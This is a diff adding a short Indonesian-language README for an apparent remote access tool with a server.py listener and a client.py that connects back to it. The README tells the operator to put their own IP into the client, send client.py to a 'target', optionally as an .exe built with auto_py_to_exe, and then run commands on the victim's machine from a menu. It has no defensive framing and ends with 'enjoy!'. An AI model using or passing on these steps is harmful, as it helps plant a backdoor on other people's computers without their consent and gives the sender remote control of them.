@@ -1,0 +1,17 @@
+Cara penggunaan Tools:
+
+1. Pada server.py di bagian :
+def __init__(self, lhost="0.0.0.0", lport=5000):
+lhost biarkan tetap agar bisa menerima berbagai IP, dan port bisa diganti terserah anda!
+
+2. Pada client.py di bagian :
+def __init__(self, rhost="192.168.18.162", rport=5000):
+pada rhost masukkan IP lu, dan rport harus sama dengan lport yang ada pada server.py
+
+3. Jalankan server.py dan tunggu target connect pada server.py
+
+4. Kirimkan client.py ke target bisa di ganti dalam bentuk exe dengan tools auto_py_to_exe di github.
+
+5. Jika berhasil connect maka silahkan masukkan perintah yang tersedia di menu!
+
+enjoy!
